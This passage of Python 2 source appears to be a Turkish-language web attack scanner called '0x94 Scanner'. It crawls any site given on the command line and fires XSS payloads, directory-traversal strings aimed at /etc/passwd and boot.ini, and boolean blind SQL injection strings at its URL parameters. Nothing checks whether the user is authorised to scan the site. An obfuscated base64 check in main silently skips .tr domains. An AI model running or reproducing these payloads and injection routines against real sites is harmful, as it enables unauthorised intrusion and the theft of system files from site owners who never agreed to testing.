                "'+alert(0x000123)+'",
                "%2Balert(0x000123)%2B'",
                "';alert(0x000123)'"]
    
    try:
	for xssler in xsspayload:
	    print "XSS Taraniyor ... "
	    urlnormal=xssurl.replace("=", "="+xssler)
	    urlac = urllib2.urlopen(urlnormal)
	    response = urlac.read()
	    if "alert(0x000123)" in response or "alert%280x000123%29" in response:
		xssmi=xsscalisiomu(response)
		if xssmi==False:
		    yaz("[#] XSS BULUNDU : " + urlnormal,True)
		else:
		    yaz("[#] XSS BULUNDU ve Satirda XSS korumasi var : " + urlnormal,True)
		   
    except urllib2.HTTPError,  e:
	if(e.code==500):
	    yaz("[#] XSS Http 500 Dondu  / Internal Server Error " +urlnormal,True)
    
    except urllib2.URLError,  e:
	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
	    #yaz(mesaj)
    except:
	mesaj="Bilinmeyen hata olustu\n"    

def lfitara(lfibul):
    
    lfiyollar=['/etc/passwd', 
	'../etc/passwd',
	'../../etc/passwd',
	'../../../etc/passwd',
	'../../../../etc/passwd',
	'../../../../../etc/passwd',
	'../../../../../../etc/passwd',
	'../../../../../../../etc/passwd',
	'../../../../../../../../etc/passwd',
	'../../../../../../../../../etc/passwd',
	'../../../../../../../../../../etc/passwd',
	'../../../../../../../../../../../etc/passwd',
        
	'../etc/passwd%00',
	'../../etc/passwd%00',
	'../../../etc/passwd%00',
	'../../../../etc/passwd%00',
	'../../../../../etc/passwd%00',
	'../../../../../../etc/passwd%00',
	'../../../../../../../etc/passwd%00',
	'../../../../../../../../etc/passwd%00',
	'../../../../../../../../../etc/passwd%00',
	'../../../../../../../../../../etc/passwd%00',
	'../../../../../../../../../../../etc/passwd%00',
        
	'boot.ini%00',
        '../boot.ini%00',
	'../../boot.ini%00',
	'../../../boot.ini%00',
	'../../../../boot.ini%00',
	'../../../../../boot.ini%00',
	'../../../../../../boot.ini%00',
	'../../../../../../../boot.ini%00',
	'../../../../../../../../boot.ini%00',
	'../../../../../../../../../boot.ini%00',
	'../../../../../../../../../../boot.ini%00',
	'../../../../../../../../../../../boot.ini%00',
        
        'boot.ini',
        '../boot.ini',
        '../../boot.ini',
        '../../../boot.ini',
        '../../../../boot.ini',
        '../../../../../boot.ini',
        '../../../../../../boot.ini',
        '../../../../../../../boot.ini',
        '../../../../../../../../boot.ini',
        '../../../../../../../../../boot.ini',
        '../../../../../../../../../../boot.ini',
        '../../../../../../../../../../../boot.ini',
        
        "..%2fboot.ini%00",
        "..2f..%2fboot.ini%00",
        "..2f..%2f..%2fboot.ini%00",
        "..2f..%2f..%2f..%2fboot.ini%00",
        "..2f..%2f..%2f..%2f..%2fboot.ini%00",
        "..2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
        "..2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00",
        
        "..%2fetc%2fpasswd%00",
        "..2f..%2fetc%2fpasswd%00",
        "..2f..%2f..%2fetc%2fpasswd%00",
        "..2f..%2f..%2f..%2fetc%2fpasswd%00",
        "..2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
        "..2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
        "..2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00",
        "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00"]
	
    try:
	for lfidizin in lfiyollar:
	    for key,value in urlparse.parse_qs(urlparse.urlparse(lfibul).query, True).items():
		lfilihal={}
		lfilihal[key]=lfidizin
		lfiparametre = urllib.urlencode(lfilihal)
		print "LFi Taraniyor ... "
		#urlnormal=lfiurl.replace("=", "="+lfidizin)
		urlac = urllib2.urlopen(lfibul+"?"+lfiparametre)
		response = temizle(urlac.read())
		if "root:" in response or "noexecute=optout" in response:
		    yaz("[#] LFI BULUNDU : " + lfibul,True)
		   
		lfilihal.clear()
    except urllib2.HTTPError,  e:
	if(e.code==500):
	    yaz("[#] LFI Http 500 Dondu  / Internal Server Error " +lfibul,True)
    
    except urllib2.URLError,  e:
	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,lfibul)
	    #yaz(mesaj)
    except:
	mesaj="Bilinmeyen hata olustu\n"
		#yaz(mesaj)       
    

def lfitest(lfiurl):
    
    try:
	print "LFI Test Yapiliyor ... "
	urlnormal=lfiurl.replace("=", "=bekirburadaydi.txt")
	urlac = urllib2.urlopen(urlnormal)
	response = temizle(urlac.read())
	if "failed to open stream" in response:
	    yaz("[#] LFI Testi BULUNDU : " + urlnormal,True)
	    lfitara(lfiurl)
	else:
	    lfitara(lfiurl)
	       
    except urllib2.HTTPError,  e:
	if(e.code==500):
	    yaz("[#] LFI Http 500 Dondu  / Internal Server Error " +urlnormal,True)
    
    except urllib2.URLError,  e:
	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
	    #yaz(mesaj)
    except:
	mesaj="Bilinmeyen hata olustu\n"
	    #yaz(mesaj)       

    
   
    

def sql(urlnormal):
    try:
	print "SQL Test Taraniyor ... "
	urlnormal=urlnormal.replace("=", "='")
	urlac = urllib2.urlopen(urlnormal)
	response = temizle(urlac.read())
	sqlkontrol(response,urlnormal)
	
    except urllib2.HTTPError,  e:
	if(e.code==500):
	    yaz("[#] SQL Http 500 Dondu  / Internal Server Error " +urlnormal,True)

    except urllib2.URLError,  e:
	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
	#yaz(mesaj)
    except:
	mesaj="Bilinmeyen hata olustu\n"
	#yaz(mesaj)   
	

def blind(urlblind):
    
    html1=""
    html2=""
    linknormal = urllib2.urlopen(urlblind)
    normalkaynak=linknormal.read()

    bitiskarakter=["","--","/*","--+",";",";--","--"]
    true_strings = ["'or''='","' or 1=1--","bekir' AND 'a'='a","' OR 'bk'='bk","' and 1=(select 1)+'","' aNd 1=1"," and 1=1"," ' and 1=1"," and 'a'='a","' and 'a'='a","' and 'a'='a"," and 1 like 1"," and 1 like 1/*"," and 1=1"," group by 1","'+(SELECT 1)+'","' and 1=(select 1)+'","'+aNd+10>1"]           
    false_strings =["'or''!!!='","' or 1=2--","bekir' AND 'a'='b","' OR 'bk'='bekir","' and 1=(select 999999)+'","' aNd 1=2"," and 1=2"," ' and 1=2"," and 'a'='b","' and 'a'='b","' and 'a'='b"," and 1 like 2"," and 1 like 2/*"," and 1=2"," group by 99999","'+(SELECT 99999)+'","' and 1=(select 2)+'","'+aNd+10>20"]	
    for sonkarakter in bitiskarakter:
	i=0
	while i < 10:    
	    print "Blind Taraniyor ... "+true_strings[i]+" "+sonkarakter
	    blindtrue = urlblind + urllib.urlencode(parse_qsl(true_strings[i]+sonkarakter)) 
	    try:
		req1 = urllib2.Request(blindtrue.replace("&",urllib.urlencode(parse_qsl(true_strings[i])) +"&").replace(" ", "%20"))
		req1.add_header('UserAgent: ','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)')
		req1.add_header('Keep-Alive: ','115')
		req1.add_header('Referer: ','http://'+urlblind)
		response1 = urllib2.urlopen(req1)
		response_headers = response1.info()
		
		html1 = temizle(response1.read())
		
	    except urllib2.HTTPError,e:
		if(e.code==500):
		    yaz("[#] URL BLIND Http 500 Dondu  / Internal Server Error " +urlblind+true_strings[i]+sonkarakter,True)
	    except urllib2.URLError,e:
		mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlblind)
		#yaz(mesaj)
	    
	    except:
		mesaj="Bilinmeyen hata olustu\n"
		#yaz(mesaj)
	    print "Blind Taraniyor ... "+false_strings[i]+" "+sonkarakter
	    blindfalse = urlblind + urllib.urlencode(parse_qsl(false_strings[i]+sonkarakter)) 
	    try:
		i=i+1
		req2 = urllib2.Request(blindfalse.replace("&",urllib.urlencode(parse_qsl(false_strings[i]+sonkarakter)) +"&").replace(" ", "%20"))
		req2.add_header('UserAgent: ','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)')
		req2.add_header('Keep-Alive: ','115')
		req2.add_header('Referer: ','http://'+urlblind)
		response2 = urllib2.urlopen(req2)
		html2 = temizle(response2.read()) 
		    
	    except urllib2.HTTPError,e:
		if(e.code==500):
		    yaz("[#] URL BLIND Http 500 Dondu  / Internal Server Error" +urlblind+false_strings[i]+sonkarakter,True)
	    except urllib2.URLError,e:
		mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlblind)
		#yaz(mesaj)
	    
	    except:
		mesaj="Bilinmeyen hata olustu\n"
		#yaz(mesaj)
       
	    if normalkaynak==html1:  
		if html1!=html2:
		    comparePages(html1,html2,response2.geturl(),"[#] GET Blind ile Sayfada Degisiklik oldu %s " % urlblind+"\nVERi = "+false_strings[i]+sonkarakter+"\n")
		    debug=1
     


    
#class YeniOpener(urllib.FancyURLopener):   
    #version = 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15'




def aynivarmi(keyurl):
    if aynilinkler.has_key(keyurl):
	return True
    else:
	return False



def optionsheader(url):
    try:
	print "Allow Header Bilgisi Aliniyor"
	o = urlparse.urlparse(url)
	sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	ipsi=socket.gethostbyname(o.hostname)
	yaz("IP Adresi : "+ipsi,True)
	sock.connect((ipsi,80))
	req = "OPTIONS / HTTP/1.1\r\n"
	req += "Host: " + o.hostname + "\r\n"
	req += "Connection: close\r\n"
	req += "\r\n\r\n"
	sock.send(req)
	data = sock.recv(1024)
	yaz(data,True)
	sock.close()
	r1 = re.compile('DAV')
	result = r1.findall(data)
	if result == []:
		yok=0
	else:
		  
	    print "[+] Sunucuda WebDav kurulu"
    except:
	print "Allow Header alinirken hata oldu"

def headerbilgi(host):
    try:
	urlac = urllib2.urlopen(host)
	robots(host)
	yaz("[#] Makina Bilgisi : "+host+" - "+str(urlac.info().getheader('Server')),True)
    except:
	print "Header bilgisi alinamadi"
	
def xsscalisiomu(kaynak):
    
    xssdurum=False
    
    bakalim=set(list(kaynak.split("\n")))
    
    for satir in bakalim:
	if "\"><0x000123>" in satir:
	    if "<code>" in satir or "<noscript>" in satir:
		xssdurum=True
	    else:
		xssdurum=False
		
    return xssdurum

def robots(host):
    try:
	urlac = urllib2.urlopen(host+"/robots.txt").read()
	if "Disallow:" in urlac or "Allow:"  in urlac:
	    yaz("[#] robots.txt dosyasi bulundu "+host+"/robots.txt",True)
    except:
	print "robots.txt kontrolu yapilamadi"



def ZiyaretSayisi(link):
    
    if "=" in link:
	toplukey=""
	dosya=link[:link.find("?")]
	toplukey=dosya
    
	for key,value in urlparse.parse_qs(urlparse.urlparse(link).query, True).items():
	    toplukey+=key
	    
	if limitlinkler.has_key(toplukey):
	    durum=True
	else:
	    limitlinkler[toplukey]=1
	    durum=False
    else:
	
	if limitlinkler.has_key(link):
	    durum=True
	else:
	    limitlinkler[link]=1
	    durum=False
	
    return durum

def locationbypass(link):

    try:
	link=link.replace("amp;","&")
	    
	if "http" not in link:
	    yeni= "http://"+link.encode('utf-8').strip()
	else:
	    yeni= link.encode('utf-8').strip() 
	return yeni
    except:
	print "Location Alinirken Hata oldu"


class Anaislem(threading.Thread):
    def __init__(self, gelensite,lock):
        threading.Thread.__init__(self)
	self.gelensite = yedekq
	self.lock  = lock
	self.tamurl=""

    def run(self):
	while not self.gelensite.empty():
	    try:
		sleep(reqbeklemesuresi)
		self.tamurl = self.gelensite.get()
		normalac(self.tamurl)
		formyaz(self.tamurl)
		headerinjection(self.tamurl)
		if "php?" in self.tamurl:
		    lfitest(self.tamurl)
		    y=2
		if "?" in self.tamurl:
		    y=1
		    sql(self.tamurl)
		    timebased(self.tamurl)
		    blind(self.tamurl)
		    xsstest(self.tamurl)
	    except:
		print "site adresi alinirken hata oldu"
		self.gelensite.task_done()
		continue
		
def temizle(source):
    
    yenisource=source.replace("<script","")
    re.sub(r"\"(.*?)\"|'(.*?)'","",yenisource)
    return yenisource

def linkler(urltara,host):
    
    try:
	
	queue.put(urltara)
	yedekq.put(urltara)
	print "Saglikli tarama icin sitedeki tum linkleri cekiyor lutfen bekleyiniz..."
	while not queue.empty():
	    qudekiveri=queue.get()
	    dahildegil = ("xlsx","htmldd","html","js","xml","ico","css","gif","jpg","jar","tif","bmp","war","ear","mpg","wmv","mpeg","scm","iso","dmp","dll","cab","so","avi","bin","exe","iso","tar","png","pdf","ps","mp3","zip","rar","gz")
	    
	    linkopener = urllib2.build_opener(HTTPAYAR,urllib2.HTTPSHandler(),urllib2.HTTPCookieProcessor())
	    linkopener.addheaders = [
		    ('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13'),
		    ("Cookie", sayfacookie)]
	    
	    #linkopener = YeniOpener()
	    #linkopener.addheaders = [
		#('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13'),
		#("Cookie", sayfacookie)]
	    
	    page = linkopener.open(qudekiveri)
	    text = page.read()
	    page.close()
	    soup = BeautifulSoup(text)
	    
	    for ee in re.findall('''href=["'](.[^"']+)["']''', text, re.I):
		if "javascript" not in ee.lower() or "mailto:" not in ee.lower() or "tel:+" not in ee.lower():
		    if ee.split('.')[-1].lower() not in dahildegil:	    
			birlesik=urlparse.urljoin(qudekiveri, ee).replace("#","")
			if aynivarmi(birlesik)==False:
			    if host in birlesik:
				tamurl2=locationbypass(birlesik)
				limiti=ZiyaretSayisi(tamurl2)
				if limiti==False:
				    print tamurl2
				    queue.put(tamurl2)
				    yedekq.put(tamurl2)
				    aynilinkler[tamurl2]="bekir"
	    
	    
	    for tag in soup.findAll('a',href=True):
		if "javascript" not in tag['href'].lower() or  "mailto:" not in tag['href'].lower() or  "tel:+" not in tag['href'].lower():
		    if tag['href'].split('.')[-1].lower() not in dahildegil:
			tag['href'] = urlparse.urljoin(qudekiveri, tag['href'])
			asilurl=tag['href'].encode('utf-8').strip()
			if aynivarmi(asilurl)==False:
			    if host in asilurl:
				tamurl=locationbypass(asilurl)
				limiti2=ZiyaretSayisi(tamurl)
				if limiti2==False:
				    print tamurl
				    queue.put(tamurl)
				    yedekq.put(tamurl)
				    aynilinkler[tamurl]="bekir"
    except:
	print "Linkleri alirken hata olustu"

    print "Linkleri Alma bitti tarama basliyor..."
    threads = []
    lock    = threading.Lock()
    for i in range(5):
	t = Anaislem(yedekq,lock)
	t.setDaemon(True)
	threads.append(t)
	t.start()
       
    while any([x.isAlive() for x in threads]):
	sleep(0.1)


def main():
    print "########################################"
    print "#                                      #"
    print "#           0x94 Scanner               #"  
    print "#        by 0x94 a.k.a The_BeKiR       #" 
    print "#        https://twitter.com/0x94      #"
    print "#                                      #"
    print "########################################"
    print ""
    if len(sys.argv) == 1:
        print "Kullanim: %s URL [URL]..." % sys.argv[0]
        sys.exit(1)
    for url in sys.argv[1:]:
	giris = base64.b64decode("LnRy")
	cikis = "{}>"
	ooooo = maketrans(giris, cikis)
	asd=url.translate(ooooo)
	if "{}>" not in asd:
		headerbilgi(url)
		optionsheader(url)
		cx=urlparse.urlparse(url)
		hostcx=cx.netloc.replace("www","")
		linkler(url,hostcx)


if __name__ == "__main__":
    main()
